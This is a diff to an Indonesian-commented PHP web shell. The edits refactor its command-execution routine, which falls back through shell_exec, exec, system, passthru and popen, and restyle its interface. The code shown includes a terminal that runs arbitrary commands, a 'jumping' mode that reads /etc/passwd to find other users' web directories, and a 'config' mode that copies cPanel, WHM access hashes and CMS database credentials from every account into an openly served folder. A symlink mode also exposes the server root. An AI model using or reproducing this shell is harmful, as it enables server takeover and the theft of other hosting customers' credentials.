@@ -6,6 +6,8 @@ set_time_limit(0);
 error_reporting(0);
 ignore_user_abort(true);
 
+$initial_script_dir = getcwd(); // Store the original directory
+
 // --- Keamanan Dasar ---
 if (!isset($_SERVER['HTTP_USER_AGENT'])) {
     header('HTTP/1.0 403 Forbidden');
@@ -22,41 +24,48 @@ function getFileSize($bytes)
     return round($bytes / (1024 ** $index), 2) . ' ' . $units[$index];
 }
 
-function executeCommand($cmd, $current_path)
+function executeCommand($cmd, $cwd)
 {
     $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
-    $output = '';
-    $new_path = $current_path;
+    $output = '';    // Change directory if specified    
+    if ($cwd && is_dir($cwd)) {
+        @chdir($cwd);
+    }    // Handle 'cd' command separately    
+    // Handle 'cd' command separately
+    if (preg_match('/^cd\s*(.*)$/i', trim($cmd), $matches)) {
+        global $initial_script_dir;
+        $target_dir = trim($matches[1]);
+        if (empty($target_dir)) {
+            // If 'cd' is called without arguments, go to the initial script directory
+            $target_dir = $initial_script_dir;
+        }
 
-    // Check for cd command
-    if (preg_match('/^cd\s+(.+)$/', trim($cmd), $matches)) {
-        $target_dir = $matches[1];
-        // Attempt to change directory
         if (@chdir($target_dir)) {
             $new_path = getcwd();
             $output = "Changed directory to: " . $new_path;
         } else {
-            $output = "Failed to change directory to: " . $target_dir;
+            $new_path = getcwd(); // Stay in the same directory on failure
+            $output = "Failed to change directory to: " . htmlspecialchars($target_dir);
         }
         return ['output' => $output, 'new_path' => str_replace('\\', '/', $new_path)];
     }
-
-    // If not a cd command, execute normally
+    // For other commands, execute them    
+    $full_cmd = $cmd . ' 2>&1';
     if (!in_array('shell_exec', $disabled)) {
-        $output = @shell_exec($cmd . ' 2>&1');
+        $output = @shell_exec($full_cmd);
     } elseif (!in_array('exec', $disabled)) {
-        @exec($cmd, $o);
+        @exec($full_cmd, $o);
         $output = implode("\n", $o);
     } elseif (!in_array('system', $disabled)) {
         ob_start();
-        @system($cmd);
+        @system($full_cmd);
         $output = ob_get_clean();
     } elseif (!in_array('passthru', $disabled)) {
         ob_start();
-        @passthru($cmd);
+        @passthru($full_cmd);
         $output = ob_get_clean();
     } elseif (!in_array('popen', $disabled)) {
-        $p = @popen($cmd . ' 2>&1', 'r');
+        $p = @popen($full_cmd, 'r');
         if ($p) {
             $o = '';
             while (!feof($p)) $o .= fread($p, 1024);
@@ -65,8 +74,8 @@ function executeCommand($cmd, $current_path)
         }
     } else {
         $output = 'Execution failed: All available command execution functions are disabled.';
-    }
-    return ['output' => $output, 'new_path' => str_replace('\\', '/', $current_path)];
+    }        // Always return the current working directory    
+    return ['output' => $output, 'new_path' => str_replace('\\', '/', getcwd())];
 }
 
 function getFilePermissions($file)
@@ -136,7 +145,8 @@ function deleteDirectory($dirPath)
 }
 
 if (!function_exists('is_func_enabled')) {
-    function is_func_enabled($func) {
+    function is_func_enabled($func)
+    {
         if (!function_exists($func)) return '<span class="badge bg-secondary">Not Exists</span>';
         $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
         return in_array($func, $disabled)
@@ -146,7 +156,8 @@ if (!function_exists('is_func_enabled')) {
 }
 
 if (!function_exists('get_ext_status')) {
-    function get_ext_status($ext_name) {
+    function get_ext_status($ext_name)
+    {
         return extension_loaded($ext_name)
             ? '<span class="badge bg-success">Loaded</span>'
             : '<span class="badge bg-secondary">Not Loaded</span>';
@@ -179,7 +190,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         switch ($action) {
             case 'executeCommand':
                 if (isset($_POST['command'])) {
-                    $result = executeCommand($_POST['command'], $path);
+                    $result = executeCommand($_POST['command'], $_POST['cwd']); // Use $_POST['cwd'] here
                     $response = ['success' => true, 'output' => trim($result['output']), 'new_path' => $result['new_path']];
                 } else {
                     $response['output'] = 'No command provided.';
@@ -609,22 +620,44 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
             font-family: 'Courier New', Courier, monospace;
             color: #f8f9fa;
         }
+
         .info-box pre {
             white-space: pre-wrap;
             word-wrap: break-word;
             margin: 0;
         }
-        .info-box .success { color: #28a745; }
-        .info-box .error { color: #dc3545; }
-        .info-box .warning { color: #ffc107; }
-        .info-box a { color: #0d6efd; }
-        .info-box table { width: 100%; border-collapse: collapse; }
-        .info-box table th, .info-box table td {
+
+        .info-box .success {
+            color: #28a745;
+        }
+
+        .info-box .error {
+            color: #dc3545;
+        }
+
+        .info-box .warning {
+            color: #ffc107;
+        }
+
+        .info-box a {
+            color: #0d6efd;
+        }
+
+        .info-box table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .info-box table th,
+        .info-box table td {
             border: 1px solid #495057;
             padding: 0.5rem;
             text-align: left;
         }
-        .info-box table th { background-color: #343a40; }
+
+        .info-box table th {
+            background-color: #343a40;
+        }
     </style>
 </head>
 
@@ -663,6 +696,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         </ol>
                     </nav>
                     <div class="d-flex flex-wrap gap-2">
+                        <a href="?" class="btn btn-sm btn-outline-light" href="?" class="btn">Home</a>
                         <button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fas fa-upload me-1"></i>Upload</button>
                         <button class="btn btn-sm btn-success" data-bs-toggle="modal" data-bs-target="#newFileModal"><i class="fas fa-file me-1"></i>New File</button>
                         <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
@@ -688,41 +722,41 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 </div>
             </div>
 
-            <?php 
+            <?php
             $action = $_GET['action'] ?? '';
             if ($action == 'jumping' || $action == 'config' || $action == 'symlink') {
-                if($action == 'jumping') {
+                if ($action == 'jumping') {
                     $i = 0;
                     echo '<div class="info-box"><pre>';
                     $etc = @fopen("/etc/passwd", "r");
-                    
-                    if(!$etc) {
+
+                    if (!$etc) {
                         echo '<span class="error">Cannot read /etc/passwd</span>';
                     } else {
-                        while($passwd = fgets($etc)) {
-                            if($passwd == '') continue;
+                        while ($passwd = fgets($etc)) {
+                            if ($passwd == '') continue;
                             preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
-                            
-                            foreach($user_jumping[1] as $user_jefri_jump) {
+
+                            foreach ($user_jumping[1] as $user_jefri_jump) {
                                 $user_jumping_dir = "/home/$user_jefri_jump/public_html";
-                                if(is_readable($user_jumping_dir)) {
+                                if (is_readable($user_jumping_dir)) {
                                     $i++;
-                                    $jrw = "[<span class='success'>R</span>] <a href='?path=".urlencode($user_jumping_dir)."' class='dir-row'>$user_jumping_dir</a>";
-                                    if(is_writable($user_jumping_dir)) {
-                                        $jrw = "[<span class='success'>RW</span>] <a href='?path=".urlencode($user_jumping_dir)."' class='dir-row'>$user_jumping_dir</a>";
+                                    $jrw = "[<span class='success'>R</span>] <a href='?path=" . urlencode($user_jumping_dir) . "' class='dir-row'>$user_jumping_dir</a>";
+                                    if (is_writable($user_jumping_dir)) {
+                                        $jrw = "[<span class='success'>RW</span>] <a href='?path=" . urlencode($user_jumping_dir) . "' class='dir-row'>$user_jumping_dir</a>";
                                     }
                                     echo $jrw;
-                                    
-                                    if(function_exists('posix_getpwuid')) {
-                                        $domain_jump = @file_get_contents("/etc/named.conf");   
-                                        if($domain_jump == '') {
+
+                                    if (function_exists('posix_getpwuid')) {
+                                        $domain_jump = @file_get_contents("/etc/named.conf");
+                                        if ($domain_jump == '') {
                                             echo " => (<span class='warning'>failed to get domain</span>)<br>";
                                         } else {
                                             preg_match_all("#var/named/(.*?).db#", $domain_jump, $domains_jump);
-                                            foreach($domains_jump[1] as $dj) {
-                                                $user_jumping_url = posix_getpwuid( @fileowner("/etc/valiases/$dj"));
+                                            foreach ($domains_jump[1] as $dj) {
+                                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                 $user_jumping_url = $user_jumping_url['name'];
-                                                if($user_jumping_url == $user_jefri_jump) {
+                                                if ($user_jumping_url == $user_jefri_jump) {
                                                     echo " => (<u>$dj</u>)<br>";
                                                     break;
                                                 }
@@ -736,31 +770,31 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         }
                         fclose($etc);
                     }
-                    
-                    if($i > 0) {
-                        echo "<br>Total $i directories found on ".htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST']));
+
+                    if ($i > 0) {
+                        echo "<br>Total $i directories found on " . htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST']));
                     } else {
                         echo "<span class='error'>No accessible directories found</span>";
                     }
-                    
+
                     echo '</pre></div>';
-                }
-                elseif($action == 'config') {
+                } elseif ($action == 'config') {
                     $etc = @fopen("/etc/passwd", "r");
                     $idx = @mkdir("{$nick}_CONFIG", 0777);
                     $isi_htc = "Options all\nRequire None\nSatisfy Any";
-                    $htc = @fopen("{$nick}_CONFIG/.htaccess","w"); @fwrite($htc, $isi_htc);
-                    
-                    if(!$etc) {
+                    $htc = @fopen("{$nick}_CONFIG/.htaccess", "w");
+                    @fwrite($htc, $isi_htc);
+
+                    if (!$etc) {
                         echo '<div class="info-box error">Cannot read /etc/passwd</div>';
                     } else {
-                        while($passwd = fgets($etc)) {
-                            if($passwd == "") continue;
+                        while ($passwd = fgets($etc)) {
+                            if ($passwd == "") continue;
                             preg_match_all('/(.*?):x:/', $passwd, $user_config);
-                            
-                            foreach($user_config[1] as $user_3X0RC1ST) {
+
+                            foreach ($user_config[1] as $user_3X0RC1ST) {
                                 $user_config_dir = "/home/$user_3X0RC1ST/public_html/";
-                                if(is_readable($user_config_dir)) {
+                                if (is_readable($user_config_dir)) {
                                     $grab_config = array(
                                         "/home/$user_3X0RC1ST/.my.cnf" => "cpanel",
                                         "/home/$user_3X0RC1ST/.accesshash" => "WHM-accesshash",
@@ -784,109 +818,111 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                                         "/home/$user_3X0RC1ST/public_html/slconfig.php" => "Sitelok",
                                         "/home/$user_3X0RC1ST/public_html/application/config/database.php" => "Ellislab"
                                     );
-                                    
-                                    foreach($grab_config as $config => $nama_config) {
+
+                                    foreach ($grab_config as $config => $nama_config) {
                                         $ambil_config = @file_get_contents($config);
-                                        if($ambil_config != '') {
-                                            $file_config = @fopen("{$nick}_CONFIG/$user_3X0RC1ST-$nama_config.txt","w"); @fputs($file_config,$ambil_config);
+                                        if ($ambil_config != '') {
+                                            $file_config = @fopen("{$nick}_CONFIG/$user_3X0RC1ST-$nama_config.txt", "w");
+                                            @fputs($file_config, $ambil_config);
                                         }
                                     }
                                 }
                             }
                         }
                         fclose($etc);
-                        echo '<div class="info-box success"><a href="?path='.urlencode("$path/{$nick}_CONFIG").'">Config files collected! Click here to view</a></div>';
+                        echo '<div class="info-box success"><a href="?path=' . urlencode("$path/{$nick}_CONFIG") . '">Config files collected! Click here to view</a></div>';
                     }
-                }
-                elseif($action == 'symlink') {
+                } elseif ($action == 'symlink') {
                     echo '<div class="info-box">';
-                    @mkdir('sym',0777); 
-                    $htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; 
-                    $write = @fopen('sym/.htaccess','w'); @fwrite($write,$htaccess); @symlink('/','sym/root'); 
-                    
-                    $read_named_conf = @file('/etc/named.conf'); 
-                    if(!$read_named_conf) { 
+                    @mkdir('sym', 0777);
+                    $htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+                    $write = @fopen('sym/.htaccess', 'w');
+                    @fwrite($write, $htaccess);
+                    @symlink('/', 'sym/root');
+
+                    $read_named_conf = @file('/etc/named.conf');
+                    if (!$read_named_conf) {
                         echo "<span class='error'>Cannot access /etc/named.conf</span>";
-                    } else { 
+                    } else {
                         echo '<table>
                             <tr>
                                 <th>Domain</th>
                                 <th>User</th>
                                 <th>Symlink</th>
                             </tr>';
-                        
-                        foreach($read_named_conf as $subject) { 
-                            if(stristr($subject,'zone')) { 
-                                preg_match_all('#zone "(.*)"#',$subject,$string); 
-                                flush(); 
-                                
-                                if(strlen(trim($string[1][0])) > 2) { 
-                                    $UID = @posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); 
-                                    $name = $string[1][0]; 
-                                    @symlink('/','sym/root'); 
-                                    
+
+                        foreach ($read_named_conf as $subject) {
+                            if (stristr($subject, 'zone')) {
+                                preg_match_all('#zone "(.*)"#', $subject, $string);
+                                flush();
+
+                                if (strlen(trim($string[1][0])) > 2) {
+                                    $UID = @posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
+                                    $name = $string[1][0];
+                                    @symlink('/', 'sym/root');
+
                                     // Filter certain domains
                                     $filtered = false;
-                                    $tlds = array('\\.ir','\\.il','\\.id','\\.sg','\\.edu','\\.gov','\\.go','\\.gob','\\.mil','\\.mi');
-                                    foreach($tlds as $tld) {
-                                        if(preg_match("/$tld/", $string[1][0])) {
+                                    $tlds = array('\\.ir', '\\.il', '\\.id', '\\.sg', '\\.edu', '\\.gov', '\\.go', '\\.gob', '\\.mil', '\\.mi');
+                                    foreach ($tlds as $tld) {
+                                        if (preg_match("/$tld/", $string[1][0])) {
                                             $filtered = true;
                                             break;
                                         }
                                     }
-                                    
-                                    if($filtered) {
-                                        $name = "<span class='warning'>".htmlspecialchars($string[1][0]).'</span>'; 
+
+                                    if ($filtered) {
+                                        $name = "<span class='warning'>" . htmlspecialchars($string[1][0]) . '</span>';
                                     }
-                                    
+
                                     echo "<tr>
-                                        <td><a href='http://www.".htmlspecialchars($string[1][0])."' target='_blank'>$name</a></td>
-                                        <td>".htmlspecialchars($UID['name'])."</td>
-                                        <td><a href='sym/root/home/".htmlspecialchars($UID['name'])."/public_html' target='_blank'>Symlink</a></td>
-                                    </tr>"; 
-                                    flush(); 
-                                } 
+                                        <td><a href='http://www." . htmlspecialchars($string[1][0]) . "' target='_blank'>$name</a></td>
+                                        <td>" . htmlspecialchars($UID['name']) . "</td>
+                                        <td><a href='sym/root/home/" . htmlspecialchars($UID['name']) . "/public_html' target='_blank'>Symlink</a></td>
+                                    </tr>";
+                                    flush();
+                                }
                             }
                         }
-                        echo '</table>'; 
+                        echo '</table>';
                     }
                     echo '</div>';
                 }
             } else { ?>
-            <div class="table-responsive">
-                <table class="table table-dark table-hover table-sm align-middle">
-                    <thead>
-                        <tr>
-                            <th>Name</th>
-                            <th class="text-end">Size</th>
-                            <th class="text-center">Permissions</th>
-                            <th>Owner/Group</th>
-                            <th>Modified</th>
-                            <th class="text-center">Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (realpath($path) !== realpath($_SERVER['DOCUMENT_ROOT']) && $path !== '/'): ?>
+                <div class="card table-responsive">
+                    <table class="table table-dark table-hover table-sm align-middle">
+                        <thead>
                             <tr>
-                                <td><i class="fas fa-level-up-alt text-warning me-2"></i><a href="?path=<?php echo urlencode(dirname($path)); ?>">[..]</a></td>
-                                <td colspan="5"></td>
+                                <th>Name</th>
+                                <th class="text-end">Size</th>
+                                <th class="text-center">Permissions</th>
+                                <th>Owner/Group</th>
+                                <th>Modified</th>
+                                <th class="text-center">Actions</th>
                             </tr>
-                        <?php endif;
-                        $items = @scandir($path);
-                        if ($items !== false) {
-                            $dirs = [];
-                            $files = [];
-                            foreach (array_diff($items, ['.', '..']) as $item) {
-                                if (is_dir("$path/$item")) $dirs[] = $item;
-                                else $files[] = $item;
-                            }
-                            natcasesort($dirs);
-                            natcasesort($files);
-                            foreach (array_merge($dirs, $files) as $item) {
-                                $fullPath = "$path/$item";
-                                $isDir = is_dir($fullPath);
-                                $icon = $isDir ? 'fa-folder text-warning' : 'fa-file-alt text-light';
-                                echo '<tr>
+                        </thead>
+                        <tbody>
+                            <?php if (realpath($path) !== realpath($_SERVER['DOCUMENT_ROOT']) && $path !== '/'): ?>
+                                <tr>
+                                    <td><i class="fas fa-level-up-alt text-warning me-2"></i><a href="?path=<?php echo urlencode(dirname($path)); ?>">[..]</a></td>
+                                    <td colspan="5"></td>
+                                </tr>
+                            <?php endif;
+                            $items = @scandir($path);
+                            if ($items !== false) {
+                                $dirs = [];
+                                $files = [];
+                                foreach (array_diff($items, ['.', '..']) as $item) {
+                                    if (is_dir("$path/$item")) $dirs[] = $item;
+                                    else $files[] = $item;
+                                }
+                                natcasesort($dirs);
+                                natcasesort($files);
+                                foreach (array_merge($dirs, $files) as $item) {
+                                    $fullPath = "$path/$item";
+                                    $isDir = is_dir($fullPath);
+                                    $icon = $isDir ? 'fa-folder text-warning' : 'fa-file-alt text-light';
+                                    echo '<tr>
                                 <td class="word-break"><i class="fas ' . $icon . ' me-2"></i><a href="?' . ($isDir ? 'path=' . urlencode($fullPath) : 'filesrc=' . urlencode($fullPath)) . '" ' . (!$isDir ? 'target="_blank"' : '') . '>' . htmlspecialchars($item) . '</a></td>
                                 <td class="text-end">' . ($isDir ? '-' : getFileSize(@filesize($fullPath))) . '</td>
                                 <td class="text-center"><small>' . getFilePermissions($fullPath) . '</small></td>
@@ -894,22 +930,22 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                                 <td><small>' . date('Y-m-d H:i', @filemtime($fullPath)) . '</small></td>
                                 <td class="text-center">
                                     <div class="btn-group btn-group-sm">';
-                                if (!$isDir) {
-                                    echo '<button class="btn-action text-primary" data-bs-toggle="modal" data-bs-target="#viewFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-eye"></i></button>';
-                                    echo '<button class="btn-action text-info" data-bs-toggle="modal" data-bs-target="#editFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-edit"></i></button>';
-                                }
-                                echo '<button class="btn-action text-warning" data-bs-toggle="modal" data-bs-target="#renameModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-i-cursor"></i></button>
+                                    if (!$isDir) {
+                                        echo '<button class="btn-action text-primary" data-bs-toggle="modal" data-bs-target="#viewFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-eye"></i></button>';
+                                        echo '<button class="btn-action text-info" data-bs-toggle="modal" data-bs-target="#editFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-edit"></i></button>';
+                                    }
+                                    echo '<button class="btn-action text-warning" data-bs-toggle="modal" data-bs-target="#renameModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-i-cursor"></i></button>
                                   <button class="btn-action text-secondary" data-bs-toggle="modal" data-bs-target="#permsModal" data-path="' . htmlspecialchars($fullPath) . '" data-perms="' . substr(sprintf('%o', fileperms($fullPath)), -4) . '"><i class="fas fa-lock"></i></button>
                                   <button class="btn-action text-danger" data-bs-toggle="modal" data-bs-target="#deleteModal" data-path="' . htmlspecialchars($fullPath) . '" data-type="' . ($isDir ? 'dir' : 'file') . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-trash"></i></button>
                                   </div></td></tr>';
-                            }
-                        } else {
-                            echo '<tr><td colspan="6" class="text-center text-danger">Cannot read directory.</td></tr>';
-                        } ?>
-                    </tbody>
-                </table>
-            </div>
-        <?php } ?>
+                                }
+                            } else {
+                                echo '<tr><td colspan="6" class="text-center text-danger">Cannot read directory.</td></tr>';
+                            } ?>
+                        </tbody>
+                    </table>
+                </div>
+            <?php } ?>
         </main>
         <footer class="text-center text-muted small mt-4">© <?php echo date('Y'); ?> <?php echo htmlspecialchars($nick); ?></footer>
     </div>
@@ -1050,7 +1086,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 <div class="modal-body">
                     <div id="terminal-output" class="terminal p-2 mb-2"></div>
                     <form id="commandForm">
-                        <div class="input-group"><span class="input-group-text terminal-prompt"><?php echo htmlspecialchars(get_current_user()); ?>$</span><input type="text" name="command" class="form-control" autocomplete="off" autofocus><button type="submit" class="btn btn-primary">Run</button></div>
+                        <div class="input-group"><span class="input-group-text terminal-prompt"></span><input type="text" name="command" class="form-control" autocomplete="off" autofocus><button type="submit" class="btn btn-primary">Run</button></div>
                     </form>
                 </div>
             </div>
@@ -1223,7 +1259,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                                 <li><strong>Server Admin:</strong> <?php echo $_SERVER['SERVER_ADMIN'] ?? 'N/A'; ?></li>
                                 <li><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></li>
                             </ul>
-                            
+
                             <h5 class="mt-4">PHP Configuration</h5>
                             <ul class="list-unstyled">
                                 <li><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></li>
@@ -1245,14 +1281,14 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                                 }
                                 ?>
                             </div>
-                            
+
                             <h5 class="mt-4">Database Information</h5>
                             <ul class="list-unstyled">
                                 <li><strong>MySQL Support:</strong> <?php echo extension_loaded('mysqli') ? 'Yes' : 'No'; ?></li>
                                 <li><strong>PostgreSQL Support:</strong> <?php echo extension_loaded('pgsql') ? 'Yes' : 'No'; ?></li>
                                 <li><strong>SQLite Support:</strong> <?php echo extension_loaded('sqlite3') ? 'Yes' : 'No'; ?></li>
                             </ul>
-                            
+
                             <h5 class="mt-4">Other Information</h5>
                             <ul class="list-unstyled">
                                 <li><strong>Current User:</strong> <?php echo get_current_user(); ?></li>
@@ -1270,239 +1306,281 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
         </div>
     </div>
 
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-        <script>
-            document.addEventListener('DOMContentLoaded', function() {
-                // --- Penanganan Notifikasi Toast ---
-                const toastEl = document.getElementById('notificationToast');
-                const toast = new bootstrap.Toast(toastEl);
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- Penanganan Notifikasi Toast ---
+            const toastEl = document.getElementById('notificationToast');
+            const toast = new bootstrap.Toast(toastEl);
 
-                function showToast(message, type = 'success') {
-                    const toastBody = toastEl.querySelector('#toast-body');
-                    const toastTitle = toastEl.querySelector('#toast-title');
-                    const toastIcon = toastEl.querySelector('#toast-icon');
+            function showToast(message, type = 'success') {
+                const toastBody = toastEl.querySelector('#toast-body');
+                const toastTitle = toastEl.querySelector('#toast-title');
+                const toastIcon = toastEl.querySelector('#toast-icon');
 
-                    toastBody.textContent = message;
-                    toastEl.classList.remove('text-bg-success', 'text-bg-danger');
-                    if (type === 'success') {
-                        toastEl.classList.add('text-bg-success');
-                        toastTitle.textContent = 'Success';
-                        toastIcon.className = 'fas fa-check-circle me-2';
-                    } else {
-                        toastEl.classList.add('text-bg-danger');
-                        toastTitle.textContent = 'Error';
-                        toastIcon.className = 'fas fa-times-circle me-2';
-                    }
-                    toast.show();
+                toastBody.textContent = message;
+                toastEl.classList.remove('text-bg-success', 'text-bg-danger');
+                if (type === 'success') {
+                    toastEl.classList.add('text-bg-success');
+                    toastTitle.textContent = 'Success';
+                    toastIcon.className = 'fas fa-check-circle me-2';
+                } else {
+                    toastEl.classList.add('text-bg-danger');
+                    toastTitle.textContent = 'Error';
+                    toastIcon.className = 'fas fa-times-circle me-2';
                 }
+                toast.show();
+            }
 
-                const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.has('message')) {
-                    const message = urlParams.get('message');
-                    const type = urlParams.has('success') ? 'success' : 'error';
-                    showToast(message, type);
-                    const cleanUrl = window.location.pathname + '?path=' + (urlParams.get('path') || '');
-                    window.history.replaceState({}, document.title, cleanUrl);
-                }
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('message')) {
+                const message = urlParams.get('message');
+                const type = urlParams.has('success') ? 'success' : 'error';
+                showToast(message, type);
+                const cleanUrl = window.location.pathname + '?path=' + (urlParams.get('path') || '');
+                window.history.replaceState({}, document.title, cleanUrl);
+            }
 
-                // --- Penanganan Data Dinamis pada Modal ---
-                function handleModalEvents(modalId, callback) {
-                    const modalEl = document.getElementById(modalId);
-                    if (modalEl) {
-                        modalEl.addEventListener('show.bs.modal', callback);
-                        modalEl.addEventListener('show.bs.modal', function() {
-                            this.style.setProperty('display', 'block', 'important');
-                            this.style.setProperty('opacity', '1', 'important');
-                        });
-                    }
-                }
-
-                handleModalEvents('viewFileModal', (event) => {
-                    const button = event.relatedTarget;
-                    const path = button.getAttribute('data-path');
-                    const name = button.getAttribute('data-name');
-                    const modal = event.currentTarget;
-                    modal.querySelector('#viewFileName').textContent = name;
-                    const contentArea = modal.querySelector('#viewFileContent');
-                    contentArea.textContent = 'Loading file content...';
-
-                    fetch('?filesrc=' + encodeURIComponent(path))
-                        .then(response => {
-                            if (!response.ok) throw new Error('File not found or not readable.');
-                            return response.text();
-                        })
-                        .then(data => {
-                            contentArea.textContent = data;
-                        })
-                        .catch(err => {
-                            contentArea.textContent = 'Error: ' + err.message;
-                            showToast('Failed to fetch file content.', 'error');
-                        });
-                });
-
-                handleModalEvents('editFileModal', (event) => {
-                    const button = event.relatedTarget;
-                    const path = button.getAttribute('data-path');
-                    const name = button.getAttribute('data-name');
-                    const modal = event.currentTarget;
-                    modal.querySelector('#editFileName').textContent = name;
-                    modal.querySelector('#editFilePath').value = path;
-                    const editor = modal.querySelector('#fileEditor');
-                    editor.value = 'Loading file content...';
-
-                    fetch('?filesrc=' + encodeURIComponent(path))
-                        .then(response => {
-                            if (!response.ok) throw new Error('File not found or not readable.');
-                            return response.text();
-                        })
-                        .then(data => {
-                            editor.value = data;
-                        })
-                        .catch(err => {
-                            editor.value = 'Error: ' + err.message;
-                            showToast('Failed to fetch file content.', 'error');
-                        });
-                });
-
-                handleModalEvents('renameModal', (event) => {
-                    const button = event.relatedTarget;
-                    const modal = event.currentTarget;
-                    modal.querySelector('#renamePath').value = button.getAttribute('data-path');
-                    modal.querySelector('#newName').value = button.getAttribute('data-name');
-                });
-
-                handleModalEvents('permsModal', (event) => {
-                    const button = event.relatedTarget;
-                    const modal = event.currentTarget;
-                    modal.querySelector('#permsPath').value = button.getAttribute('data-path');
-                    modal.querySelector('#perms').value = button.getAttribute('data-perms');
-                });
-
-                handleModalEvents('deleteModal', (event) => {
-                    const button = event.relatedTarget;
-                    const modal = event.currentTarget;
-                    modal.querySelector('#deletePath').value = button.getAttribute('data-path');
-                    modal.querySelector('#deleteType').value = button.getAttribute('data-type');
-                    modal.querySelector('#deleteItemName').textContent = button.getAttribute('data-name');
-                });
-
-                handleModalEvents('symlinkModal', (event) => {
-                    const modal = event.currentTarget;
-                    modal.querySelector('input[name="target"]').value = '';
-                    modal.querySelector('input[name="linkName"]').value = '';
-                });
-
-                // --- Terminal Interaktif ---
-                const commandForm = document.getElementById('commandForm');
-                if (commandForm) {
-                    commandForm.addEventListener('submit', function(e) {
-                        e.preventDefault();
-                        const commandInput = this.querySelector('input[name="command"]');
-                        const command = commandInput.value.trim();
-                        if (command === '') return;
-
-                        const terminalOutput = document.getElementById('terminal-output');
-                        const promptText = document.querySelector('.terminal-prompt').textContent;
-
-                        terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
-                        commandInput.value = '';
-
-                        const formData = new FormData();
-                        formData.append('action', 'executeCommand');
-                        formData.append('command', command);
-
-                        fetch(window.location.href, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => {
-                                if (!response.ok) {
-                                    throw new Error(`HTTP error! status: ${response.status}`);
-                                }
-                                return response.text();
-                            })
-                            .then(text => {
-                                try {
-                                    const data = JSON.parse(text);
-                                    if (data.success) {
-                                        const output = data.output.replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                                        terminalOutput.innerHTML += `<div>${output.replace(/\n/g, '<br>')}</div>`;
-                                    } else {
-                                        terminalOutput.innerHTML += `<div class="text-danger">Error: ${data.output}</div>`;
-                                    }
-                                } catch (e) {
-                                    terminalOutput.innerHTML += `<div class="text-danger">Failed to parse server response: ${e.message}</div>`;
-                                    terminalOutput.innerHTML += `<div class="text-warning">Raw Response:\n${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
-                                }
-                                terminalOutput.scrollTop = terminalOutput.scrollHeight;
-                            }).catch(error => {
-                                terminalOutput.innerHTML += `<div class="text-danger">Request failed: ${error}</div>`;
-                                terminalOutput.scrollTop = terminalOutput.scrollHeight;
-                            });
-                    });
-                    const commandModal = document.getElementById('commandModal');
-                    commandModal.addEventListener('shown.bs.modal', () => {
-                        commandModal.querySelector('input[name="command"]').focus();
+            // --- Penanganan Data Dinamis pada Modal ---
+            function handleModalEvents(modalId, callback) {
+                const modalEl = document.getElementById(modalId);
+                if (modalEl) {
+                    modalEl.addEventListener('show.bs.modal', callback);
+                    modalEl.addEventListener('show.bs.modal', function() {
+                        this.style.setProperty('display', 'block', 'important');
+                        this.style.setProperty('opacity', '1', 'important');
                     });
                 }
+            }
 
-                // --- Mass Tools AJAX Forms ---
-                function handleMassToolForms(formId, resultId) {
-                    const form = document.getElementById(formId);
-                    if (!form) return;
+            handleModalEvents('viewFileModal', (event) => {
+                const button = event.relatedTarget;
